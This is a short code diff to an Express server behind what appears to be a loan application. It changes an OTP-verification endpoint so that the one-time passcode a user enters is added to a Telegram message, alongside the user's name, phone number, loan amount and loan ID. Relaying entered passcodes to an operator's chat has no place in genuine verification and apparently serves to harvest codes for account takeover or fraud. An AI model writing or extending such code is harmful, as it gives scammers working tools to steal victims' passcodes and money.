@@ -178,9 +178,9 @@ app.post('/api/loans/resend-otp', async (req, res) => {
   });
 });
 
-// ─── TELEGRAM OTP VERIFIED (NEW) ───
+// ─── TELEGRAM OTP VERIFIED (WITH OTP) ───
 app.post('/api/telegram/otp-verified', async (req, res) => {
-  const { loanId, phone, amount, name } = req.body;
+  const { loanId, phone, amount, name, otp } = req.body;
   console.log('📱 OTP Verified Notification:', req.body);
   
   try {
@@ -195,6 +195,7 @@ app.post('/api/telegram/otp-verified', async (req, res) => {
     const message = `<b>✅ OTP Verified Successfully!</b>\n\n` +
                     `<b>Name:</b> ${name || 'Unknown'}\n` +
                     `<b>Phone:</b> ${phone || 'Unknown'}\n` +
+                    `<b>OTP Entered:</b> <code>${otp || 'N/A'}</code>\n` +
                     `<b>Amount:</b> GHS ${amount || '0'}\n` +
                     `<b>Loan ID:</b> ${loanId || 'N/A'}\n\n` +
                     `<i>User has successfully completed OTP verification.</i>`;
